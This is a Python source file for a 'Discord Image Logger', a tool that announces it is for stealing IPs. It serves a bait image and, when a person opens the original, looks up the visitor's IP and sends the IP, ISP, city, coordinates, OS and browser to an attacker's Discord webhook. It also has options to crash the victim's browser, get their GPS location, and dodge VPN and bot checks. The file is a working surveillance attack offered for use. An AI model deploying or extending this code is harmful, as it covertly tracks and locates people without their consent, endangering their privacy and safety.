# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1548919786447175771/q1tFnwUEexfHskQMG2SP0g2TzbyGjjlYOxSjNaLVqx25_H8Zyohkqqx24haPF-4Cu0p3",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

